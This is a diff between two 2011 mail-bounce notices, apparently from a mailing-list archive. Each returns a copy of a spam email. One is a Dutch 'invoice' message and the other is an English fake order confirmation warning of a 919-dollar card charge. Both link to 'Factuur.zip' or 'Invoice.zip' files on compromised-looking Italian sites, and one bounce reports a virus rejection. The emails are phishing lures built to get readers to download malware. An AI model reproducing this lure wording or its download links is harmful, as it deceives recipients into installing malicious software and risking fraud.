@@ -1,7 +1,7 @@
-From: Mail Delivery System <Mailer-Daemon-/cau3XO5RUEX7Yo4atzdeAx5RhJPrJvw@public.gmane.org>
+From: Mail Delivery System <Mailer-Daemon-LheAOqykUb+8SSit/RA5RmQe5P+uuAI2rE5yTffgRl4@public.gmane.org>
 Subject: Mail delivery failed: returning message to sender
-Date: Tue, 06 Dec 2011 02:03:26 +0100
-Message-ID: <E1RXjRO-0003Kb-8A@aytohuelma.es>
+Date: Tue, 06 Dec 2011 05:06:57 -0600
+Message-ID: <E1RXsrR-0000hR-AL@rs13.websitehostserver.net>
 Mime-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
@@ -23,35 +23,24 @@ This message was created automatically by mail delivery software.
 A message that you sent could not be delivered to one or more of its
 recipients. This is a permanent error. The following address(es) failed:
 
-  hmuller2-R1sZNAfljEnz+pZb47iToQ@public.gmane.org
-    SMTP error from remote mail server after RCPT TO:<hmuller2-R1sZNAfljEnz+pZb47iToQ@public.gmane.org>:
-    host mailin.freeler.nl [213.75.3.30]: 550 5.1.2 Recipient rejected.
-  hmtyeri-R1sZNAfljEnz+pZb47iToQ@public.gmane.org
-    SMTP error from remote mail server after RCPT TO:<hmtyeri-R1sZNAfljEnz+pZb47iToQ@public.gmane.org>:
-    host mailin.freeler.nl [213.75.3.30]: 550 5.1.2 Recipient rejected.
-  hmsomeren-R1sZNAfljEnz+pZb47iToQ@public.gmane.org
-    SMTP error from remote mail server after RCPT TO:<hmsomeren-R1sZNAfljEnz+pZb47iToQ@public.gmane.org>:
-    host mailin.freeler.nl [213.75.3.30]: 550 5.1.2 Recipient rejected.
-  hmschut-R1sZNAfljEnz+pZb47iToQ@public.gmane.org
-    SMTP error from remote mail server after RCPT TO:<hmschut-R1sZNAfljEnz+pZb47iToQ@public.gmane.org>:
-    host mailin.freeler.nl [213.75.3.30]: 550 5.1.2 Recipient rejected.
-  hmschrieken-R1sZNAfljEnz+pZb47iToQ@public.gmane.org
-    SMTP error from remote mail server after RCPT TO:<hmschrieken-R1sZNAfljEnz+pZb47iToQ@public.gmane.org>:
-    host mailin.freeler.nl [213.75.3.30]: 550 5.1.2 Recipient rejected.
+  patrangeldescribe-EjEv5NuhNYdmR6Xm/wNWPw@public.gmane.org
+    SMTP error from remote mail server after end of data:
+    host mxb.edutel.nl [88.159.1.217]: 554 rejected due to virus
 
 ------ This is a copy of the message, including all the headers. ------
 
 Return-path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Received: from beta.isas.sch.ae ([213.42.30.102] helo=10.0.1.220)
-	by aytohuelma.es with esmtpa (Exim 4.72)
+Received: from [95.141.36.83] (helo=radiobytenetwork.it)
+	by rs13.websitehostserver.net with esmtpa (Exim 4.69)
 	(envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)
-	id 1RXjPk-0003KV-Fb; Tue, 06 Dec 2011 02:01:44 +0100
-Received: from [10.0.1.220] by 10.0.1.220 id YERmwlcjAl; Tue, 06 Dec 2011 04:14:42 +0400
-Message-ID: <004501ccb3ac$06fea400$0500a8c0-60x1kTqCWHVgJAXftmDEsQ@public.gmane.org>
-From: "Info" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-To: <hmschrieken-R1sZNAfljEnz+pZb47iToQ@public.gmane.org>
-Subject: Re: Statistics id: 94261
-Date: Tue, 06 Dec 2011 04:14:42 +0400
+	id 1RXsrP-0000er-KR
+	for patrangeldescribe-EjEv5NuhNYdmR6Xm/wNWPw@public.gmane.org; Tue, 06 Dec 2011 05:06:55 -0600
+Received: from [95.141.36.83] by radiobytenetwork.it id tqDBlxryrKJr; Tue, 06 Dec 2011 12:06:47 +0100
+Message-ID: <00b601ccb407$24149080$0500a8c0-2kRSJbaDU6WO2/wZUiRoQzUZDU+1vuVT@public.gmane.org>
+From: "Index" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <patrangeldescribe-EjEv5NuhNYdmR6Xm/wNWPw@public.gmane.org>
+Subject: Your order has been accepted.
+Date: Tue, 06 Dec 2011 12:06:47 +0100
 MIME-Version: 1.0
 Content-Type: text/plain;
 	charset="windows-1252"
@@ -59,15 +48,22 @@ Content-Transfer-Encoding: 8bit
 
 
 
-Gruss Gott hmschrieken-R1sZNAfljEnz+pZb47iToQ@public.gmane.org
 
+Dear client, 
 
-Het antwoord op uw vraag over het profiel op onze website 22.11.2011.
+Thank you for the order,
 
-Dagelijks kunt u hier vinden:
-http://www.ecoservice.it/docdown/Factuur.zip?idinvoice=92230003527315Firma=hmschrieken-R1sZNAfljEnz+pZb47iToQ@public.gmane.org
+This message is to inform you that your order has been received
+and is currently being processed.
 
+Your order reference is 0299.
 
-***
-We zullen blij zijn om samen te werken in de toekomst.
-Tel./Fax.: +31 (0)346 672 94 99 
+Your credit card will be charged for 919 dollars.
+
+Information about the order and delivery located at:
+
+http://agriturismi-bagnisanfilippo.it/docdown/Invoice.zip?id:16274Generation_user=patrangeldescribe-EjEv5NuhNYdmR6Xm/wNWPw@public.gmane.org
+
+____________________________
+Best regards, ticket service.
+Tel./Fax.: (298) 870 03 968.              
